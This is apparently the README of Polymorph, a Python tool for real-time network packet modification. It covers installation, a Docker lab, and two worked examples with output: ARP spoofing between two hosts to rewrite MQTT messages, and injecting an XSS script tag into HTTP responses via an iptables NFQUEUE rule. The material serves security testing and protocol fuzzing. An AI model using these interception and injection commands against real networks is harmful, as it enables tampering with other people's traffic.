# Polymorph

Polymorph is a framework written in Python 3 that allows the modification of network packets in real time, providing maximum control to the user over the contents of the packet. This framework is intended to provide an effective solution for real-time modification of network packets that implement practically any existing protocol, including private protocols that do not have a public specification. In addition to this, one of its main objectives is to provide the user with the maximum possible control over the contents of the packet and with the ability to perform complex processing on this information.


# Installation

## Download and installation on Linux (Recommended)

Polymorph is specially designed to be installed and run on a Linux operating system, such as Kali Linux. Before installing the framework, the following requirements must be installed:

```
apt-get install build-essential python-dev libnetfilter-queue-dev tshark tcpdump python3-pip wireshark
```
After the installation of the dependencies, the framework itself can be installed with the Python pip package manager in the following way:
```
pip3 install polymorph
```

## Docker environment

From the project root:
```
docker-compose up -d
```
To access any of the machines of the environment:
```
docker exec -ti [polymorph | alice | bob] bash
```

# Using Polymorph

The Polymorph framework is composed of two main interfaces:

 - **Polymorph:** It consists of a command console interface. It is the main interface and it is recommended to use it for complex tasks such as modifying complex protocols in the air, making modifications of types in fields of the template or modifying protocols without public specification.
 - **Phcli:** It is the command line interface of the Polymorph framework. It is recommended to use for tasks such as modification of simple protocols or execution of previously generated templates.

## Using the Polymorph main interface
For examples and documentation please refer to:

-   [English whitepaper](https://github.com/shramos/polymorph/blob/master/doc/whitepaper/whitepaper_english.pdf)
-   [Spanish whitepaper](https://github.com/shramos/polymorph/blob/master/doc/whitepaper/whitepaper_spanish.pdf)
-   [Building a Proxy Fuzzer for the MQTT protocol with Polymorph](http://www.shramos.com/2018/04/building-proxy-fuzzer-for-mqtt-protocol.html)

## Using the Phcli

### Modifying packets that implement the MQTT protocol

Let's see how to use the Polymorph command line interface to spoof the communication between two machines and modify MQTT protocol.

 - Let's start by seeing how the Polymorph framework dissects the MQTT Publish packet.
```
# phcli -p mqtt --show-fields --in-pkt test_topic

[INFO] Waiting for a network packet which implements the MQTT protocol
[INFO] The packet will be dissected to show its fields
[OK] Sniffing process started. Waiting for packets...
[OK] Packet captured. Printing the fields...

---[ RAW.MQTT ]---
str hdrflags          = 0 (0x00000030)
int msgtype           = 48 (3)
int dupflag           = 48 (0)
int qos               = 48 (0)
int retain            = 48 (0)
int len               = 24 (24)
int topic_len         = 10 (10)
str topic             = test_topic (test_topic)
str msg               = test_message (test_message)
```

 - Now that we know how polymorph dissects the MQTT Publish packets and how it names the fields, we are going to modify the `msg` field by spoofing the two remote machines that communicate using MQTT.

```
# phcli -s arp -tg 192.168.1.102 -g 192.168.1.121 -p mqtt -f msg -v "new_value" --in-pkt "test_topic"

[OK] ARP spoofing started between 192.168.1.121 and 192.168.1.102
[INFO] Polymorph needs to capture a packet like the one you want to modify in real time to learn how it is.
[INFO] It will be in sniffing mode until you generate the packet
[OK] Sniffing mode started. Waiting for packets...
[INFO] Great! Polymorph has the structure of the packet! Let's start breaking things!
[OK] Process of interception and modification of packets in real time started.
[*] Waiting for packets...

(Press Ctrl-C to exit)

###[ IP ]### 
  version   = 4
  ihl       = 5
  tos       = 0x0
  len       = 75
  id        = 28767
  flags     = DF
  frag      = 0
  ttl       = 63
  proto     = tcp
  chksum    = 0x471e
  src       = 192.168.1.102
  dst       = 192.168.1.121
  \options   \
###[ TCP ]### 
     sport     = 49198
     dport     = 1883
     seq       = 4046645883
     ack       = 938260113
     dataofs   = 8
     reserved  = 0
     flags     = PA
     window    = 229
     chksum    = 0x7526
     urgptr    = 0
     options   = [('NOP', None), ('NOP', None), ('Timestamp', (3643906, 1823353))]
###[ Raw ]### 
        load      = '0\x16\x00\ntest_topicnew_value'
```

### Modifying packets that implement the HTTP protocol

Let's see a last example modifying HTTP packets in localhost to inject a simple XSS. After executing the command simply navigate with your browser through an HTTP page.
```
# phcli -p tcp --in-pkt "</html>" -b "\-54:\-20" -v '"><script>alert("hacked")</script>' -ipt "iptables -A INPUT -j NFQUEUE --queue-num 1"

[INFO] Polymorph needs to capture a packet like the one you want to modify in real time to learn how it is.
[INFO] It will be in sniffing mode until you generate the packet
[OK] Sniffing mode started. Waiting for packets...
[INFO] Great! Polymorph has the structure of the packet! Let's start breaking things!
[OK] Process of interception and modification of packets in real time started.
[*] Waiting for packets...

(Press Ctrl-C to exit)

###[ IP ]### 
  version   = 4
  ihl       = 5
  tos       = 0x0
  len       = 898
  id        = 9382
  flags     = DF
  frag      = 0
  ttl       = 54
  proto     = tcp
  chksum    = 0xef66
  src       = 194.150.169.131
  dst       = 192.168.0.167
  \options   \
###[ TCP ]### 
     sport     = http
     dport     = 52210
     seq       = 3481765999
     ack       = 2589984605
     dataofs   = 8
     reserved  = 0
     flags     = PA
     window    = 2049
     chksum    = 0x3df4
     urgptr    = 0
     options   = [('NOP', None), ('NOP', None), ('Timestamp', (4180691237, 3065344385))]
###[ Raw ]### 
        load      = 'm Mongo\n10.  Elite World News by Dr. Dude\n11.  Elite World News by Dr. Dude\n\n\nComing soon...\n\n                                 Phrack Jolt!\n\n                       All the VMBs and TWICE the c0deZ!\n_______________________________________________________________________________\n</pre>\n\n</div>\n</div>\n\n</center>\n\n<div align="center" class="texto-2-bold">\n[ <a href="../../index.html" title="News">News</a> ]\n[ <a href="../../papers/dotnet_instrumentation.html" title="Paper Feed">Paper Feed</a> ]\n[ <a href="../../issues/69/1.html" title="Issues">Issues</a> ]\n[ <a href="../../authors.html" title="Authors">Authors</a> ]\n[ <a href="../../archives/" title="Archives">Archives</a> ]\n[ <a href="../../contact.html" title="Contact">Contact</a> ]\n</div>\n\n<div align="right" class="texto-1">\xc2\xa9 Copyl"><script>alert("hacked")</script>iv>\n</body>\n</html>\n'
```

# Release Notes
[release-notes-1.0.0](https://github.com/shramos/polymorph/blob/master/doc/release-notes/release-notes-1.0.0.md)\
[release-notes-1.0.2](https://github.com/shramos/polymorph/blob/master/doc/release-notes/release-notes-1.0.2.md)

# Contact

[shramos@protonmail.com](mailto:shramos@protonmail.com)
